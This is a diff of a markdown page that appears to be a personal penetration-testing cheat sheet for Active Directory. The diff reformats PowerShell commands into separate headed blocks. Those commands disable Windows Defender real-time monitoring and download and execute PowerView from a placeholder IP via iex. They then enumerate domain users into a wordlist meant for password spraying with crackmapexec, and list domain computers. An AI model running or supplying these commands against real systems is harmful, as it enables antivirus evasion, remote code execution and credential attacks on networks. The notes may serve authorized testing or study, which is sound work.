@@ -15,23 +15,28 @@ permalink: /brainbox/
 <span style="color: Green;"># Patch AMSI or disable AV</span>
 <span class="demo-highlight"># Patch AMSI or disable AV</span>
 
-
 ```powershell
       Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
       iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
 ```
  <br>
+<span class="demo-highlight"># Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying</span>
 
 ```powershell
       Get-NetUsers | select samaccountname > username.txt
-      
-      # Get all the computers in the domain
-      Get-NetComputer
-
-      # Get information about specific computer
-      Get-NetComputer -Identity <computer_name>
 ```
+<br>
+<span class="demo-highlight"># Get all the computers in the domain</span>
 
+```powershell
+Get-NetComputer
+```
+<br>
+<span class="demo-highlight"># Get information about specific computer</span>
+
+```powershell
+Get-NetComputer -Identity <computer_name>
+```
 
 
 ```python
